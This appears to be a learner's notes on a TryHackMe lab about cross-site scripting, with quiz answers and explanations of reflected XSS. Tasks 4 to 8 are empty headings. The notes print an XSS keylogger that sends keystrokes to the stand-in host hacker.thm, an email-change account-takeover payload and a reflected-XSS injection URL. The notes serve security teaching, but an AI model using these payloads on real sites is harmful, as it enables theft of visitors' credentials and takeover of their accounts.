![Background](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/03376575e888fd097280c51469c29fbc.png)

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/c1c509a263e7a42bece2f0b77fd1ba1b.png" width="200" height="200" align="left">

# Cross-Site Scripting

**Learn how to detect and exploit XSS vulnerabilities, giving you control of other visitor's browsers.**

**If you want to check out the room [click here](https://tryhackme.com/room/xssgi)**

---

<br>

**Table of Contents**

- [Cross-Site Scripting](#cross-site-scripting)
  - [Task 1 Room Brief](#task-1-room-brief)
  - [Task 2 XSS Payloads](#task-2-xss-payloads)
  - [Task 3 Relfected XSS](#task-3-relfected-xss)
  - [Task 4 Stored XSS](#task-4-stored-xss)
  - [Task 5 DOM Based XSS](#task-5-dom-based-xss)
  - [Task 6 Blind XSS](#task-6-blind-xss)
  - [Task 7 Perfecting your payload](#task-7-perfecting-your-payload)
  - [Task 8 Practical Example (Blind XSS)](#task-8-practical-example-blind-xss)

## Task 1 Room Brief

**What does XSS stand for?**

    Cross-Site Scripting

## Task 2 XSS Payloads

**Which document property could contain the user's session token?**

    document.cookie

**Which JavaScript method is often used as a Proof Of Concept?**

    alert

btoa()

: Is a function that accepts javascript string as an parameter and base64 encodes it in order to make it safe for a browser to transport. This along with the `document.cookie` parameter an attacker can steal a victims cookie session in order to login as that user without knowing the credentials.

📰 **Note:** Javascript can be used in order to set a keylogger on the victim site thus giving the attacker the chance to passively gather user keystrokes with the goal of obtaining credentials. An example line for a XSS keylogger may look like this:

```js
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

Business Logic attacks

: These are flaws in the original design and implementation of the web app that allow an attaker to be able to exectue unintended behavior. This can be used to essentially put the attacker as a Man In The Middle between the user and the application itself. An example of this in terms of XSS would be as follows:

```js
<script>user.changeEmail('attacker@hacker.thm');</script>
```

Where the `user.changeEmail()` would be a function within the application that would enable the attaker to change the official email of the site to one of their control thus potentially posing as a help desk or customer support for the user and social engineering the victim into divulging information/credentials giving access over the victims account.

## Task 3 Relfected XSS

**Where in an URL is a good place to test for reflected XSS?**

    Parameters

Although there are different types of XSS attacks, **Reflected** XSS occurs when a malicious script is, as the name suggests, reflected off a web app to the victim browser through a link in order to activate the attack. This can be used to acquire the victims session cookie/token, this type of behavior can be seen when a web app processes the data in an unsafe way and reflects the parameter in it's response back to the user as shown below.

Original unsafe URL:

```http
https://insecure-website.com/search?term=gift

The response from the web app to this link would look like this:

<p>You searched for: gift</p>
```

Now, when a malicious actor injects their script into the parameter field it can look like this:

```http
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>

The response from the web app to this link would look like this:

<p>You searched for: <script>/* Bad stuff here... */</script></p>
```

📰 **Note:** This sort of attack can be performed in numerous ways and creativity is key but it vulnerability will need modification depending on what sort of protection is in place on the web app itself so keep a lookout for any details that might give it away.
## Task 4 Stored XSS

## Task 5 DOM Based XSS

## Task 6 Blind XSS

## Task 7 Perfecting your payload

## Task 8 Practical Example (Blind XSS)
